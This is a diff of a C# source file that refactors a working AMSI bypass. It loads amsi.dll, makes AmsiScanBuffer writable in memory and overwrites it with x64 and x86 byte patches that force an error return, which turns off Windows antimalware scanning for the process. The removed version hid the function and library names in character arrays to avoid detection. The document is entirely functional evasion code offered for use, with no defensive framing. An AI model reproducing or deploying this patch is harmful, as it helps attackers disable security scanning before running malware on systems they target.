@@ -1,37 +1,57 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 
-namespace AMSI
+public class Amsi
 {
-    public class Bypass
+    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+
+    public static void Bypass()
     {
-        [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        if (is64Bit())
+            PatchAmsi(x64);
+        else
+            PatchAmsi(x86);
+    }
 
-        [DllImport("kernel32")]
-        public static extern IntPtr LoadLibrary(string name);
-
-        [DllImport("kernel32")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-        public static int Disable()
+    private static void PatchAmsi(byte[] patch)
+    {
+        try
         {
-            char[] chars = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' };
-            String funcName = string.Join("", chars);
-            
-            char[] chars2 = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' };
-            String libName = string.Join("", chars2);
+            var lib = Win32.LoadLibrary("amsi.dll");
+            var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");
 
-            IntPtr Address = GetProcAddress(LoadLibrary(libName), funcName);
+            uint oldProtect;
+            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
 
-            UIntPtr size = (UIntPtr)5;
-            uint p = 0;
-
-            VirtualProtect(Address, size, 0x40, out p);
-            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-            Marshal.Copy(Patch, 0, Address, 6);
-
-            return 0;
+            Marshal.Copy(patch, 0, addr, patch.Length);
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine(" [x] {0}", e.Message);
+            Console.WriteLine(" [x] {0}", e.InnerException);
         }
     }
+
+    private static bool is64Bit()
+        {
+            bool is64Bit = true;
+
+            if (IntPtr.Size == 4)
+                is64Bit = false;
+
+            return is64Bit;
+        }
+}
+
+class Win32
+{
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 }
